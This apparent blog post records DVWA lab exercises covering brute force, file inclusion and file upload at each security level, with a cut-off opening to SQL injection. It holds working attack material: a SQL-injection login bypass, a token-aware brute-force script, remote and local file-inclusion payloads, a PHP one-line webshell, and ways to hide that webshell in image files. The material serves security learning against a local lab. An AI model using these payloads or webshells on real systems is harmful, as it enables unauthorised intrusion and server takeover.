---
title: DVWA练习记录(二)
date: 2020-02-07 15:30:13
categories: Web
---

# Brute Force（暴力破解）

暴力破解指的是黑客使用穷举法猜解出用户口令，是最为广泛使用的手法之一。在很多情况下，用户会使用不安全的、很容易被猜解的密码，使得这种攻击变得可能。为了提高猜解的成功率，黑客往往还会与社会工程学结合，从不同渠道获取用户的相关信息，如生日、姓名等可能用来作为密码的信息，再基于这些信息构建字典，将其任意组合对密码进行猜解。

理论上说，若网站对口令输入的尝试次数为无限的话，使用穷举法猜解密码总能够成功。所以需要网站进行一定的限制，如多次输入错误限制输入等。

<!-- more -->

DVWA给出的是一个登录的界面，若登录成功则提示进入受保护区域：

![](https://hujiekang.top/images/uploads/big/25c1fbdaabb65151e31b5355bfe4fb6f.png)

## 安全等级`Low`

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];
    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );
    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];
        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"/DVWA{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

从源代码中可以看出，首先SQL语句没有做任何的注入防护，所以可以直接SQL注入登录，Payload：`http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin'#&password=whatever&Login=Login#`
其次，输入框是可以进行无限次尝试的，所以也可以进行暴力破解，这里使用Burpsuite中的Intruder模块进行爆破。

首先抓包，选择`Send to Intruder`将请求发送至Intruder进行处理：

![](https://hujiekang.top/images/uploads/big/3b1845c23dada8de1346451ca4cb5c0f.png)

Intruder模块有四种模式，[这篇文章](https://blog.csdn.net/ai_64/article/details/91351364)对其做了很形象的解释：
>Sniper：狙击手模式，顾名思义，字典里取一行，打一发请求。
>Battering Ram：散弹枪模式，顾名思义，字典里取一行，打一发请求。相同的输入放到多个位置的情况，所有位置填充一样的值。
>Pitchfork：音叉模式，顾名思义，相当于大合唱中有默契地各干各的事情，每个位置都有一个字典，打一发请求，大家一起取下一行。请求的数量由字典行最少哪位决定。
>Cluster Bomb：集束炸弹，顾名思义，爆炸时迸射出许多小炸弹的集束炸弹，最复杂的一个模式，类似于数学中的笛卡尔积，每个位置都有一个字典，通常字典数量不超过3个，不然破解过程很漫长，可能要等到下次宇宙大爆炸。

Payload选项卡里可以加载自定义字典，字典可以自己写，也可以找现成的，Burpsuite里面也有自带的字典。这里使用了<https://github.com/duyetdev/bruteforce-database>。

一切设置就绪之后就可以点击`Start Attack`发起爆破攻击。在攻击界面每一行都会显示这一次攻击的返回状态，包括HTTP状态码、返回数据长度、是否出错等等。
因为登录成功或失败返回页面内容是不一样的，所以在这里判别是否登录成功显然是从返回数据长度入手。可以看见密码为`123456`时返回数据长度为`4768`，其余攻击返回长度均为`4725`，故可以判定`123456`就是密码，而下方的返回页面也证明了这一点。

![](https://hujiekang.top/images/uploads/big/7ead363c966de123270483993e1156aa.png)

## 安全等级`Medium`

`Medium`使用[`mysqli_real_escape_string()`](https://www.runoob.com/php/func-mysqli-real-escape-string.html)对特殊字符进行了转义，防止了字符型SQL注入，同时在密码输入错误时添加了2s的延时。

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );
    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];
        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"/DVWA{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

同样的方法进行爆破，可以看到除了返回结果慢了一些外，没有任何区别。。。

![](https://hujiekang.top/images/uploads/big/f8f50aed41a9fd2b8fd5c6fd93209a26.png)

## 安全等级`High`

`High`加入了Anti-CSRF Token，所以不能使用Burpsuite直接爆破了，需要在每次发起请求时在页面中获取`user_token`才能够成功发送请求。

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );
    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];
        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"/DVWA{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```

这里使用Python脚本：

```python
import requests
from bs4 import BeautifulSoup

# Set HTTP Header
header = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Cookie': 'security=high; PHPSESSID=f747249d70789fd4264d382a90f45174',
    'Host': '127.0.0.1',
    'Referer': 'http://127.0.0.1/DVWA/vulnerabilities/brute/index.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'
}

# Load Password Dictionary
with open('dict.txt', 'r') as f:
    passwd_dict = f.read().split('\n')
    f.close()

# Get Token
def get_user_token(url):
    r = requests.get(url, headers = header)
    print('Status:'+str(r.status_code)+'\tSize:'+str(len(r.text)), end='\t')
    soup = BeautifulSoup(r.text, "lxml")
    return soup.find('form').find_all('input')[3]['value']

# Start Sending Requests
token = get_user_token('http://127.0.0.1/DVWA/vulnerabilities/brute/')
print()
for passwd in passwd_dict:
    token = get_user_token('http://127.0.0.1/DVWA/vulnerabilities/brute/index.php?username=smithy&password='+passwd+'&Login=Login&user_token='+token)
    print('Password:'+passwd)
```

脚本先读取字典，然后使用`BeautifulSoup`寻找页面中的`user_token`，逐次提交请求，返回对应的状态。下面是运行截图（便于展示，将字典内容减少至20个）：

![](https://hujiekang.top/images/uploads/big/eb3bb4cb0eff2fdf592cbb0cac6e56b3.png)

## 安全等级`Impossible`

`Impossible`首先对数据库加入了PDO防止了SQL注入，然后对多次登录失败的情况使用了账户锁定15分钟的措施，有效的防止了爆破。

![](https://hujiekang.top/images/uploads/big/e21f7b5ff9ee4d8beb6bca3a72c9a20b.png)

下面是源代码：

```php
<?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Default values
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // Check the database (Check user information)
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // Check to see if the user has been locked out.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = strtotime( $row[ 'last_login' ] );
        $timeout    = $last_login + ($lockout_time * 60);
        $timenow    = time();

        /*
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
        */

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow < $timeout ) {
            $account_locked = true;
            // print "The account is locked<br />";
        }
    }

    // Check the database (if username matches the password)
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // If its a valid login...
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // Get users details
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // Login successful
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"/DVWA{$avatar}\" />";

        // Had the account been locked out since last login?
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
        }

        // Reset bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    } else {
        // Login failed
        sleep( rand( 2, 4 ) );

        // Give the user some feedback
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // Update bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // Set the last login time
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

# File Inclusion（文件包含）

当`php.ini`中开启`allow_url_include`选项时，就可以通过PHP的某些特性函数（`include()`，`require()`和`include_once()`，`require_once()`）利用URL去动态包含文件。若此时没有对文件的来源和名称等信息进行审查和过滤，就可能产生任意文件读取漏洞。

文件包含包括本地文件包含（Local File Inclusion，LFI）和远程文件包含（Remote File Inclusion，RFI）。远程文件包含漏洞的出现需要`php.ini`中的`allow_url_fopen`选项为开启状态。

DVWA中给了一个选择的界面：选择其中的`.php`一个文件会展示对应的页面内容：

![](https://hujiekang.top/images/uploads/big/388fd07e250dbab69c66c5a718fb2036.png)

当然除此之外，注意到参数`page`是我们可以控制的。

## 安全等级`Low`

`Low`等级没有任何的防护措施，直接将`page`参数的值作为文件路径去读取文件：

```php

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

1. `RFI`

  在攻击者服务器上创建`evil.txt`：

  ```php
  <?php
  echo '<center style="font-size:50px;padding:20px">You Are Hacked!!!</center><br>';
  echo var_dump($_SERVER);
  ?>
  ```

  Payload：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=https://www.hujiekang.top/downloads/evil.txt`

  ![](https://hujiekang.top/images/uploads/big/ed4545019d3f87248ba909214d3b3cf1.png)

2. `LFI`

  读取本地`hosts`文件：

  Payload：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\Windows\System32\drivers\etc\hosts`

  ![](https://hujiekang.top/images/uploads/big/124f7ad95ae79d53bfa0c3cd3aacaeed.png)

  上面为绝对路径，相对路径类似，不再赘述。

## 安全等级`Medium`

`Medium`对`http://`、`https://`、`../`、`..\`做了过滤：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```

可以看到使用的是字符串替换函数，故均可使用双写绕过：

Payload：
- LFI：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..././..././..././evil.php`
- RFI：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=htthttps://ps://www.hujiekang.top/downloads/evil.txt`

除此之外，这种过滤方法对绝对路径文件包含没有任何影响。。。

## 安全等级`High`

`High`使用了`fnmatch()`对传入的文件名进行匹配，要求传入的`page`参数必须以`file`开头。

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

所以在这里RFI是不可用的。LFI可以使用`file:///`协议来实现。`file:///`协议是一个用于读取本地文件的协议，也是十分常见的一个协议。下图Chrome打开本地一个PDF文件使用的就是`file:///`协议。

![](https://hujiekang.top/images/uploads/big/191e3a49eca3864960253bfb91b27932.png)

那么就可以使用`file:///`实现任意本地文件读取了。Payload：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///D:\phpstudy\WWW\evil.php`
`evil.php`文件内容：`<?php phpinfo(); ?>`

访问结果成功显示出`phpinfo`：

![](https://hujiekang.top/images/uploads/big/dcdbc57fa2ddcac74b5e865890be46fe.png)

不过由于只能读取本地文件，而在实际的服务器生产环境下，往服务器里写入一个文件并非那么容易。所以要想实现任意命令执行，还需要配合一个文件上传的漏洞，先将文件上传至服务器，再在这里使用`file:///`包含进来执行。关于文件上传下面会讲到。

## 安全等级`Impossible`

`Impossible`使用了白名单的机制，当且仅当文件名为`include.php`、`file1.php`、`file2.php`、`file3.php`时才能被包含进来，这样无论如何都无法进行其他的文件包含。

源代码：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

# File Upload（文件上传）

当下很多的应用情景都用到了文件上传。但是如果服务器端不对上传的文件进行文件名、文件内容、文件相关信息等的审查，就很可能会带来很严重的后果。

DVWA对应的也是给了一个上传文件的界面，上传成功之后会将文件路径显示在页面上：

![](https://hujiekang.top/images/uploads/big/fd5ece97a53bf9f1da9454960229a294.png)

## 安全等级`Low`

`Low`等级和之前一样，还是无任何防护措施，只有当上传的临时文件移动至目录失败时才会提示上传失败：

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

这种没有任何防护的情况，首先就存在任意命令执行的漏洞。只需要将恶意文件上传之后，输入对应路径就能够访问。
任意命令执行最常用的获取权限的方法就是使用一句话木马：`<?php @eval($_POST['evil']) ?>`
将它存为一个文件之后上传至目标服务器，然后使用中国菜刀或者中国蚁剑这样的软件进行连接，就拿到Webshell了。

下面使用虚拟机搭建一台靶机，IP地址为`192.168.0.102`，打开DVWA界面，上传一句话木马：

![](https://hujiekang.top/images/uploads/big/c6fdb69c0c82a649a638de7a77044f1f.png)

然后使用中国蚁剑连接靶机，取得Webshell，可以任意访问靶机中的所有文件，以及虚拟终端：

![](https://hujiekang.top/images/uploads/big/54ff028e043790e1b813bacdaa3a83a3.png)

注：Win10下使用一句话木马一定要关闭Windows Defender。。。不然秒被删

## 安全等级`Medium`

`Medium`中对上传文件的MIME类型进行了过滤，只允许`image/jpeg`、`image/png`两种，并没有进行文件内容的审查。

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {
        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

1. 恶意图片文件+文件包含
   这种情况在不抓包修改的情况下，单纯上传包含恶意代码的图片是不会被直接执行的，服务器会认为是一张图片，在访问时直接显示图片内容。
   所以需要借助文件包含漏洞，将其包含至PHP中执行。
   把之前的一句话木马文件的后缀修改为`.png`或`.jpg`后上传，发现成功通过审查上传成功：

   ![](https://hujiekang.top/images/uploads/big/f57093ae33303204ab85380b6d027a20.png)

   之后使用`Medium`级别的文件包含将其包含进页面：

   Payload：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=....//....//hackable/uploads/evil.png`

   然后就可以使用中国蚁剑登录了（由于DVWA自身带有身份验证的原因，需要在连接的时候带上Cookie，否则无法连接）：

   ![](https://hujiekang.top/images/uploads/big/ceea56894124a0de01567d611470dbd5.png)

2. Burpsuite直接改后缀名
   这个太简单了，抓包改掉后缀即可。。。放一张图吧

   ![](https://hujiekang.top/images/uploads/big/4c8c43fea794771e62457b02f6a8280d.png)

3. Burpsuite改`chr(0)`截断
   先说说截断的原理吧：我们知道PHP的内核大多都是C语言，而C语言里面判断一个字符串是否结尾就是看是否遇见`'\0'`字符，也就是`chr(0)`。所以如果在文件名中间加入一个`chr(0)`，PHP会认为这个字符串到`chr(0)`这就结束了，`chr(0)`后面的字符串就会被截断。

   先把`evil.png`文件名改成`evil.php .png`，留一个空格方便抓包时修改；然后上传该文件，抓包，在Hex部分找到空格对应的字符(`' '=chr(20)`)，将其改为`00`后提交，可以看见文件名已经变成了`evil.php`：

   ![](https://hujiekang.top/images/uploads/big/3a5808cd22d6d9eecd6b417de6e6a47e.png)

   关于`%00`截断：`%00`截断是PHP在5.3.4版本之前的一个漏洞，要求PHP的`magic_quotes_gpc`为关闭状态。在非`enctype=multipart/form-data`的表单中或URL或Cookie中加入字符串`%00`会导致截断问题，其原因是PHP将`%00`进行了`urldecode()`处理，得到了`chr(0)`，于是在代码中同一行`chr(0)`后面的字符和代码均被截断。
   更多参考：
   <http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html>
   <https://skysec.top/2017/09/06/%E8%BF%87%E6%B0%94%E7%9A%8400%E6%88%AA%E6%96%AD/>


## 安全等级`High`

`High`等级添加了对文件后缀的过滤，通过`strrpos()`来查找`.`最后一次出现的位置，然后取其后面的子串作为文件的后缀名；同时使用[`getimagesize()`](https://www.runoob.com/php/php-getimagesize.html)检查了图片的文件头，像前面那种不含文件头的图片文件将不会被上传。

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

于是我们就要想办法给我们的恶意文件添加图片文件头。

1. Windows下`cmd`中使用`copy`命令可以直接将两个文件合并（Powershell中无效，原因未知）

   ```bash
   # 图片文件后面一定跟的是 /b ，否则产生的文件大小会和PHP文件大小差不多，且无法读取
   copy avatar.png/b+evil.php/a evil.png
   ```

   ![](https://hujiekang.top/images/uploads/big/2582c2172031d07dce84256c25d1b2f7.png)

2. 使用[ExifTool](https://exiftool.org/)修改图片文件头

   ```bash
   exiftool -DocumentName="<?php @eval($_POST['evil']) ?>" evil.png
   ```

   ![](https://hujiekang.top/images/uploads/big/90dba4d9b79d8193f134fcccf23c007e.png)

接下来上传文件，没有问题成功上传：

![](https://hujiekang.top/images/uploads/big/d34f1b4b81b29b7c7480b872728f74a2.png)

然后使用文件包含就可以成功Getshell，参照上面的步骤。

受[这篇文章](https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/)的启发，还可以结合命令注入漏洞利用：

```bash
# Windows
copy D:\phpstudy\WWW\DVWA\hackable\uploads\evil.png D:\phpstudy\WWW\DVWA\hackable\uploads\evil.php

# Linux
mv /www/DVWA/hackable/uploads/evil.png /www/DVWA/hackable/uploads/evil.php
```

## 安全等级`Impossible`

`Impossible`中同时对上传文件的后缀名、MIME类型、以及文件内容进行了检查，同时加入了Anti-CSRF Token。
除此之外，程序使用了[`imagecreatefromjpeg()`](https://www.php.net/imagecreatefromjpeg)、[`imagecreatefrompng()`](https://www.php.net/imagecreatefrompng)、[`imagejpeg()`](https://www.php.net/manual/zh/function.imagejpeg.php)、[`imagepng()`](https://www.php.net/manual/zh/function.imagepng.php)、[`imagedestroy()`](https://www.php.net/manual/zh/function.imagedestroy.php)这五个方法，将上传的图片创建为一个图片对象，然后基于这个对象重新生成一张图片。这样就过滤掉了那些图片必要信息之外的数据，保证了图片的安全性。

下面的程序尝试将之前生成的恶意图片经过这个流程输出，可以发现输出的文件里面所有的恶意代码都被除去。

```php
<?php

$img = imagecreatefrompng('evil.png');
imagepng( $img, 'normal.png', 9);
imagedestroy( $img );

?>
```

![](https://hujiekang.top/images/uploads/big/7096649dce3d1273a5b85e40983dfe5a.png)

源代码：

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

# SQL Injection（SQL注入）

SQL注入指的是通过外部输入注入代码至SQL查询语句，从而从数据库中读取敏感数据、修改数据甚至修改数据库的一些配置。简写为SQLi。
SQL注入分为数字型注入、字符型注入和搜索型注入（此处未涉及），对应的SQL语句大致如下：

- 数字型：<code>SELECT column_name FROM table_name WHERE int_column = <b style="color:red">value</b></code>
- 字符型：<code>SELECT column_name FROM table_name WHERE char_column = '<b style="color:red">value</b>'</code>
- 搜索型：<code>SELECT * FROM table_name WHERE column LIKE '%<b style="color:red">value</b>%'</code>

下面根据DVWA提供的环境进行分析。

DVWA给出的要求：
> *There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.*
> *在数据库中有五个用户，他们的ID从1~5。你的任务就是通过SQL注入窃取他们的密码。*

## 安全等级`Low`

`Low`等级提供的一个ID输入框，输入正确的ID可以获取对应的用户信息：

![](https://hujiekang.top/images/uploads/big/e5091e34983b3ccea4791f3e45c2ba8a.png)

源代码如下，可以看见程序只是将输入直接代入查询语句进行查询，并未做任何过滤措施：

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
